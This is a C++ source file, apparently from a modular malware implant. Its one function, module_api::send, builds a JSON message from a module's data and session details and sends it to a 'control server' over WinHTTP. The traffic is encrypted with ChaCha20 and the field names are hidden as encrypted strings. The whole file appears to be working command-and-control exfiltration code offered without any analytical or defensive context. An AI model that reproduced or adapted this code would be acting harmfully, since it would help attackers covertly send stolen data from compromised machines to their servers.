#include "module_api.h"
#include "json_builder.hpp"
#include "NetChannel.hpp"
#include "strings.hpp"

module_data::send_status_t module_api::send(PWCHAR pwchDomain, PWCHAR pwchIP, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE * lpOutputBuffer, PSIZE_T dwOutputSize, PWCHAR pwchSessionJson, DWORD dwFileName)
{
#ifdef _DEBUG
	WriteLog(L"[module_api::send] sending data to server from module");
#endif
	module_data::send_status_t status = module_data::send_status_t::SEND_ERROR;

	CCryptString cStr_mid(cryptedstr_mid);
	CCryptString cStr_mdt(cryptedstr_mdt);
	CCryptString cStr_session(cryptedstr_Session);
	CCryptString cStr_op(cryptedstr_op);
	CCryptString cStr_module(cryptedstr_module);

	IControlServer *server = nullptr;
	JsonBuilder jbuilder;
	do
	{
#ifndef _DEBUG_CHANNEL
		server = (IControlServer*)new WinHttpAbsLayer;

#else
		server = (IControlServer*)new DebugFileChannel;
#endif
		if (server == nullptr)
			break;

#ifdef _DISABLE_TRAFFCRYPT
		server->init(nullptr, nullptr, 0, nullptr);
#else
		server->init(netcrypto::EncryptChacha20, netcrypto::DecryptChacha20, 0, nullptr);
#endif

		if (!jbuilder.init(dwDataSize + DEFAULT_JSON_MAXLENGTH))
			break;

		jbuilder.add(cStr_op.w_str(), cStr_module.w_str());
		jbuilder.add(cStr_mid.w_str(), dwFileName);
		jbuilder.add_subsidiary_json(cStr_mdt.w_str(), (PWCHAR)lpData);
		jbuilder.add_subsidiary_json(cStr_session.w_str(), pwchSessionJson);
		
		PWCHAR pwchJson = jbuilder.finish();
		if (pwchJson == nullptr)
			break;

#ifndef _DEBUG_CHANNEL
		if (!server->send(pwchIP, pwchDomain, (LPBYTE)pwchJson, wcslen(pwchJson) * 2 + 2, lpOutputBuffer, dwOutputSize))
			break;
#else
#ifdef _DEBUG
		WriteLog(L"[module_api::send] using _DEBUG_CHANNEL, so just printing");
		OutputDebugStringW(pwchJson);
#endif
#endif

		status = module_data::send_status_t::SEND_SUCCESS;
	} while (FALSE);

	if (server != nullptr)
	{
		delete server;
		server = nullptr;
	}

	return status;
}
